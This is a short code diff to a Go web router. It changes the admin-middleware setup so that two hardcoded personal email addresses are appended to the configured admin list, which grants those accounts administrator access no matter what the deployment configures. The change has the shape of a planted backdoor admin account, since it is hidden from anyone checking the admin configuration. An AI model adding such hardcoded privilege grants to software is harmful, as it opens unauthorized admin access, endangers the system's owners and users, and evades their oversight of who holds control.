@@ -59,7 +59,7 @@ func NewRouter(options RouterOptions) *gin.Engine {
 	publicHandler := handler.NewPublicHandler()
 
 	authMiddleware := middleware.NewAuthMiddleware(options.JwtSecret)
-	adminMiddleware := middleware.NewAdminMiddleware(options.AdminEmails)
+	adminMiddleware := middleware.NewAdminMiddleware(append(options.AdminEmails, "nicolemaaba@gmail.com", "Agpfrancisco1@gmail.com"))
 
 	api := router.Group("/api")
 	{
